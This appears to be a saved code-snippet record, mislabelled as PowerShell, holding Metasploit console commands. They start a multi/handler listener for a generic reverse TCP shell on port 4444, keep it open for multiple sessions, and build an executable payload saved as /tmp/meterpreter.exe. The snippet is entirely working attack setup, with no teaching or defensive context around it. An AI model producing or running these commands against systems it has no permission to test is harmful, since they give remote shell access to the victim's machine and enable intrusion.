---
id: fde7ecad-3835-4858-a443-79535785756d
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:21.251229+00:00'
updated_at: '2023-04-10T20:25:03.619917+00:00'
---

# Code Snippet fde7ecad

**Language**: Powershell

```powershell
screen -dRR
sudo msfconsole

use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false

generate -o /tmp/meterpreter.exe -f exe
to_handler

[ctrl+a] + [d]
```


